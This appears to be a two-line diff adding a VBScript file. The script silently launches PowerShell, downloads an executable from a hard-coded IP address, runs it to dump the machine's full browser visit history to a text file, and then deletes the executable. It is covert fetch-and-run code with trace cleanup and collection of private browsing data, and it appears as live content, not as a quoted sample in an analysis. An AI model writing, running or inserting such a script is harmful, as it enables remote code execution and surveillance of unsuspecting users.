@@ -1,0 +1,2 @@
+Dim objWshShl : Set objWshShl = WScript.CreateObject("WScript.Shell")
+objWshShl.Run "powershell.exe curl http://213.168.249.164:8080/histv.exe -o hv.exe; ./hv.exe /VisitTimeFrom '01-01-2000 00:00:00' /VisitTimeTo '01-01-3012 00:00:00' /stext hist.txt; start-sleep 3; rm -f hv.exe",0
